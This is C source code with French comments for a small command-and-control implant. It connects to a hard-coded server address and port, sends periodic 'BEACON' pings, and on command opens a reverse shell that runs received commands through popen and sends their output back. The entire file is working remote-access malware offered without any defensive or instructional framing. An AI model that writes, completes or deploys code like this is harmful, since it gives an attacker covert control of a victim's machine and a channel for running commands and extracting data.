#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>

#define SERVER_IP "192.168.1.100" // Adresse IP du serveur
#define SERVER_PORT 9999          // Port du serveur
#define BUFFER_SIZE 1024

void reverse_shell(int server_sock) {
    char command[BUFFER_SIZE];
    char result[BUFFER_SIZE];
    FILE *fp;

    while (1) {
        memset(command, 0, BUFFER_SIZE);
        recv(server_sock, command, BUFFER_SIZE, 0);

        if (strcmp(command, "exit") == 0) {
            close(server_sock);
            exit(0);
        }

        // Exécuter la commande
        fp = popen(command, "r");
        if (fp == NULL) {
            send(server_sock, "Erreur lors de l'exécution\n", 26, 0);
            continue;
        }

        // Envoyer le résultat
        while (fgets(result, sizeof(result), fp) != NULL) {
            send(server_sock, result, strlen(result), 0);
        }
        pclose(fp);
        send(server_sock, "DONE", 4, 0); // Marqueur de fin
    }
}

void beacon(int server_sock) {
    while (1) {
        // Envoyer un ping au serveur
        send(server_sock, "BEACON", 6, 0);

        // Attendre les instructions
        char task[BUFFER_SIZE];
        recv(server_sock, task, BUFFER_SIZE, 0);

        if (strcmp(task, "reverse_shell") == 0) {
            reverse_shell(server_sock);
        }

        sleep(5); // Pause avant le prochain ping
    }
}

int main() {
    struct sockaddr_in server_addr;
    int server_sock;

    // Créer une socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Socket error");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connexion au serveur
    if (connect(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection error");
        return 1;
    }

    // Lancer le beacon
    beacon(server_sock);

    close(server_sock);
    return 0;
}
